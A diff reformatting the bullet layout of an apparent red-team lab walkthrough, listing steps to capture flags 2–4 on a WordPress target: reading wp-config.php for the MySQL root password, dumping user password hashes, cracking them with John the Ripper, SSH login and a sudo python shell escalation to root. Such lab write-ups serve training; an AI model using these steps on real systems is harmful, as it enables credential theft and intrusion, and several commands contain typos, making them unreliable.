@@ -64,74 +64,74 @@ The Red Team was able to penetrate Target 1 and retrieve the following confident
 			- nano service.html
 			-  ctrl+w “flag”
 
-o flag2.txt: fc3fd58dcdad9ab23faca6e9a36e581c
-* Exploit Used
-* I went back one directory and listed the files and found flag 2
-* cd ..
-* ls
-* cat flag2.txt
+	- flag2.txt: fc3fd58dcdad9ab23faca6e9a36e581c
+		- Exploit Used
+			- I went back one directory and listed the files and found flag 2
+			- cd ..
+			- ls
+			- cat flag2.txt
 
-o flag3.txt: afc01ab56b50591e7dccf93122770cd2
-* Exploit Used
-* I went back to the html directory and went into the wordpress directory and listed the directories
-* cd html
-* cd wordpress
+	- flag3.txt: afc01ab56b50591e7dccf93122770cd2
+		- Exploit Used
+			- I went back to the html directory and went into the wordpress directory and listed the directories
+			- cd html
+			- cd wordpress
 
-* I then went into the wp-config file and found the password for sql login
-* Nano wp-config.php
-
-
-* I logged in via sql
-* mysql -u root -P password: R@v3nSecurity
-
-* I then viewed the databases then viewed the tables
-* show databases;
-* show tables;
+			- I then went into the wp-config file and found the password for sql login
+			- Nano wp-config.php
 
 
-* I then selected wp_posts and was able to find flag3
-* select * from wp_posts;
+			- I logged in via sql
+			- mysql -u root -P password: R@v3nSecurity
+
+			- I then viewed the databases then viewed the tables
+			- show databases;
+			- show tables;
 
 
-o Flag4.txt: 715dea6c055b9fe3337544932f2941ce
-* Exploit Used
-* While still being logged in via sql I described the table wp_users
-* describe wp_users;
-
-* I then formatted the username and passwords being separated by a colon sign.
-* select concat_ws(‘:’, user_login, user_pass) from wp_users;
-
-* I then outputted the formatted table into text file in the www directory and then viewed the file under michael
-* select concat_ws(‘:’, user_login, user_pass) from wp_users into outfile ‘var/www/wp_hashes.txt’;
-* cat wp_hashes.txt
-
-* I copied wp_hashes.txt file and exited Michael’s computer and pasted the file on www directory on my pc
-* “copied username and passwords”
-* Exit
-* cd /var/www
-* ls
-* touch wp_hashes.txt
-* nano wps_hashes.txt
-* “pasted username and passwords”
+			- I then selected wp_posts and was able to find flag3
+			- select * from wp_posts;
 
 
+	- Flag4.txt: 715dea6c055b9fe3337544932f2941ce
+		- Exploit Used
+			- While still being logged in via sql I described the table wp_users
+			- describe wp_users;
+
+			- I then formatted the username and passwords being separated by a colon sign.
+			- select concat_ws(‘:’, user_login, user_pass) from wp_users;
+
+			- I then outputted the formatted table into text file in the www directory and then viewed the file under michael
+			- select concat_ws(‘:’, user_login, user_pass) from wp_users into outfile ‘var/www/wp_hashes.txt’;
+			- cat wp_hashes.txt
+
+			- I copied wp_hashes.txt file and exited Michael’s computer and pasted the file on www directory on my pc
+			- “copied username and passwords”
+			- Exit
+			- cd /var/www
+			- ls
+			- touch wp_hashes.txt
+			- nano wps_hashes.txt
+			- “pasted username and passwords”
 
 
 
 
-* I ran john the ripper to brute force the password with the usernames and found the password for steven
-* John wp_hashes.txt
 
-* I logged into Steven via ssh 
-* ssh steven password:pink84
 
-* I ran a python command to login via root
-* sudo python -c ‘import pty:pty.spawn(“/bin/bash”)’
+			- I ran john the ripper to brute force the password with the usernames and found the password for steven
+			- John wp_hashes.txt
 
-* I then went into the root directory I ran the list command and found flag 4 and then I viewed the flag
-* cd /root
-* ls
-* cat flag4.txt
+			- I logged into Steven via ssh 
+			- ssh steven password:pink84
+
+			- I ran a python command to login via root
+			- sudo python -c ‘import pty:pty.spawn(“/bin/bash”)’
+
+			- I then went into the root directory I ran the list command and found flag 4 and then I viewed the flag
+			- cd /root
+			- ls
+			- cat flag4.txt
 
 
 
